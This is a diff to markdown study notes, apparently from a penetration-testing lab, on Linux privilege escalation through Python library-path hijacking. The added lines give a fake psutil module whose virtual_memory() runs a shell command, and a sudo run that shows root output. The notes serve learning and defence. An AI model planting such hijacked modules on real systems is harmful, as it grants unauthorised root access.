@@ -55,7 +55,27 @@ shell-session
 
 Solution: Take advantage of this misconfiguration by creating your own `psutils` module containing your own malicious `virtual_memory()` function in the `/usr/lib/python3.8`
 
-> [!NOTE] In a previous example, the mem_status script, that used the virtual_memory() function, was found to be writeable to all users
+> [!NOTE] In a previous example, the mem_status script, which used the virtual_memory() function, was found to be writeable to all users. I will recreate this in a file below called psutil.py. This file must have all the same parameters, functions and name as the imported psutil.py.
+
+```
+#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system('id')
+```
+
+### Privilege Escalation via Hijacking Python Library Path
+```
+sudo /usr/bin/python3 mem_status.py
+
+uid=0(root) gid=0(root) groups=0(root)
+Traceback (most recent call last):
+  File "mem_status.py", line 4, in <module>
+    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+AttributeError: 'NoneType' object has no attribute 'available' 
+```
 ### PYTHONPATH 
 
 `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.
